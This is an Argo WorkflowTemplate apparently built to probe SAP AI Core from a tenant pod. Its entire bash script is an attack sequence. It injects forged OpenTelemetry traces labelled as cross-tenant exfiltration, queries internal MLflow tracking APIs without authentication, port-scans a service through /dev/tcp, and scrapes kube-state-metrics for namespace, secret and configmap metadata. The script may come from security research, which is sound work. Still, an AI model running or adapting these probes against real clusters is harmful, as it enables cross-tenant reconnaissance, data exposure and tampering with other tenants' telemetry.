apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "24.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        echo "=== V24 OTEL INJECTION + ML-TRACKING + LARGE KSM ==="
        
        echo "=== OTEL TRACE INJECTION ==="
        curl -s -X POST "http://otel-collector.opentelemetry.svc.cluster.local:4318/v1/traces" -H "Content-Type: application/json" -d '{"resourceSpans":[{"resource":{"attributes":[{"key":"service.name","value":{"stringValue":"attacker-injected-service"}},{"key":"malicious.tag","value":{"stringValue":"cross-tenant-data-exfil"}}]},"scopeSpans":[{"scope":{"name":"attack-probe"},"spans":[{"traceId":"d4cda95b652f4a1592b449d5929fda1b","spanId":"6e0c63257de34c92","name":"injected-operation","kind":1,"startTimeUnixNano":"1710340000000000000","endTimeUnixNano":"1710340001000000000","attributes":[{"key":"injection.test","value":{"stringValue":"poc-from-tenant-pod"}}]}]}]}]}' -w "\nHTTP: %{http_code}" 2>&1
        
        echo ""
        echo "=== ML-TRACKING WITH CURL AND HEADERS ==="
        echo "--- No auth ---"
        curl -s "http://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 200
        echo ""
        echo "--- With AI-Resource-Group header ---"
        curl -s -H "AI-Resource-Group: default" "http://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 200
        echo ""
        echo "--- MLflow API endpoints ---"
        for ep in "/api/2.0/mlflow/experiments/list" "/api/2.0/mlflow/runs/search" "/api/2.0/mlflow/registered-models/list" "/api/2.0/mlflow/artifacts/list" "/api/2.0/mlflow/metrics/get-history" "/ajax-api/2.0/mlflow/experiments/list"; do
          echo -n "$ep: "
          curl -s -w "%{http_code}" -o /tmp/mlresp "http://ml-tracking-service.ml-tracking.svc.cluster.local${ep}" 2>&1
          echo " $(head -c 100 /tmp/mlresp)"
        done
        
        echo ""
        echo "=== ML-TRACKING INTERNAL PORT SCAN ==="
        for port in 80 443 5000 8080 8443 9090 3306 5432; do
          echo -n "Port $port: "
          timeout 2 bash -c "echo > /dev/tcp/ml-tracking-service.ml-tracking.svc.cluster.local/$port" 2>&1 && echo "OPEN" || echo "closed"
        done
        
        echo ""
        echo "=== FULL KSM - ALL NAMESPACES ==="
        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep "^kube_namespace_" | head -50
        
        echo ""
        echo "=== KSM - SECRETS METADATA ==="
        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep -E "^kube_secret" | head -30
        
        echo ""
        echo "=== KSM - CONFIGMAPS ==="
        curl -s "http://ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep -E "^kube_configmap" | head -30
        
        echo ""
        echo "=== KSM-CUSTOM - ALL METRICS ==="
        curl -s "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | head -100
        
        echo ""
        echo "=== KSM-MULTI - CRONJOBS WITH SCHEDULES ==="
        curl -s "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics" 2>&1 | grep "kube_cronjob" | head -30
        
        echo ""
        echo "=== DYNATRACE OTEL ==="
        curl -s -X POST "http://otel-collector.dynatrace.svc.cluster.local:4317/" -H "Content-Type: application/json" -d '{}' -w "\nHTTP: %{http_code}" 2>&1 | head -c 500
        
        echo ""
        echo "=== SCRAPER METRICS ==="
        curl -s "http://otel-scraper-collector-monitoring.opentelemetry.svc.cluster.local:8888/metrics" 2>&1 | head -c 2000
        
        echo "=== V24 DONE ==="
